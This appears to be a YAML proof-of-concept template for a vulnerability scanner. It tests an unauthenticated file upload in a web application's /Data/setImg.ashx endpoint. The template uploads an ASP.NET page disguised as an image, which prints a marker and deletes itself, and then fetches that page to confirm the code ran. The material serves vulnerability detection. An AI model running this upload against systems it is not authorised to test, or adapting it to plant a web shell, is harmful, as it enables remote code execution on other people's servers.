name: poc-yaml-fangtianyunzhihui-setImg.ashx-File-upload
transport: http
  

set:
  randbody: base64Decode("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==")
  rboundary: randomLowercase(8)

rules:
  r0:
    request:
      method: POST
      path: /Data/setImg.ashx
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: 
       "------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.aspx\"\r\n\
        Content-Type: image/jpg\r\n\
        \r\n\
        <%@ Page Language=\"C#\" %><% Response.Write(\"{{randbody}}\"); System.IO.File.Delete(Request.PhysicalPath); %>\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: response.status == 200
    output:
      search: '"(?P<uploadfile>.*?\\.aspx)".bsubmatch(response.body)'
      uploadfile: search["uploadfile"]

  r1:
    request:
      method: GET
      path: /UploadFile/CustomerFile/{{uploadfile}}
    expression: response.status == 200 && response.body.bcontains(bytes(randbody))

expression: r0() && r1()


detail:
  author: Superhero
  links:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486449&idx=1&sn=9f88cd32efd2b28a0a9649cb324cd69b&chksm=c267bec2f51037d470650f1adb4614ab2947a876f7157c672a03860effce616f7471aa829dab&token=1628549949&lang=zh_CN#rd

